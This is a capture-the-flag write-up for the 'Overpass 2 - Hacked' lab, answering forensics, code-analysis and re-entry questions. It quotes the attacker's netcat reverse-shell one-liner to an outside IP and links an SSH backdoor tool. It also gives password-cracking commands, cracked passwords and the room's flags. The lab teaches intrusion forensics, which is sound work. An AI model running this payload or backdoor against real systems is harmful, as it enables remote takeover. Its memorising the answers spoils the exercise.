# Overpass 2 - Hacked


- Task 1 `Forensics - Analyse the PCAP`
> Download The pcapng File and run with wireshark
> What was the URL of the page they used to upload a reverse shell? `/development/`
> What payload did the attacker use to gain access?`exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`
> What password did the attacker use to privesc? `whenevernoteartinstant`
> How did the attacker establish persistence? `https://github.com/NinjaJc01/ssh-backdoor`
> Using the fasttrack wordlist, how many of the system passwords were crackable? `4`
```bash
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
```
- Task 2 `Research - Analyse the code`
> What's the default hash for the backdoor? `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`
> What's the hardcoded salt for the backdoor? `1c362db832f3f864c8c2fe05f2002a05`
> 
What was the hash that the attacker used? - go back to the PCAP for this! `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
> Crack the hash using rockyou and a cracking tool of your choice. What's the password?
`november16`
    using `hashcat -m 1710 -o plain_pass.txt enc_pass.txt /usr/share/wordlists/rockyou.txt`

- Task 3 Attack - Get back in!
    Scan using nmap target machine `nmap -sC -sV -A 10.10.122.187 > nmap_scan`
    ```bash 
        2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
        | ssh-hostkey: 
        |_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
ssh james@10.10.122.187 -oHostKeyAlgorithms=ssh-rsa -p2222

> The attacker defaced the website. What message did they leave as a heading? `H4ck3d by CooctusClan`
> What's the user flag? `thm{d119b4fa8c497ddb0525f7ad200e6567}`
> What's the root flag? `thm{d53b2684f169360bb9606c333873144d}`
